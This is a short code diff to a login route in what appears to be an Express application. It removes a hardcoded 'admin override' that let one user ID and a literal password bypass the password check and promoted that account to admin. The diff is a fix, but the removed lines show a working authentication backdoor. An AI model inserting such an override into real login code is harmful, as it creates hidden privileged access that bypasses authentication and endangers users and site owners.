@@ -260,18 +260,9 @@ router.post('/login', async (req, res) => {
         }
 
         const isMatch = await user.matchPassword(password);
-
-        // --- CUSTOM ADMIN OVERRIDE ---
-        // If specific credentials match, ensure user is Admin
-        if (user.userId === 1135841 && password === '010504@spl') {
-            if (!user.isAdmin) {
-                user.isAdmin = true;
-                await user.save();
-            }
-        } else if (!isMatch) {
+        if (!isMatch) {
             return res.status(401).json({ message: 'Invalid credentials' });
         }
-        // -----------------------------
 
         const token = jwt.sign(
             { userId: user.userId },
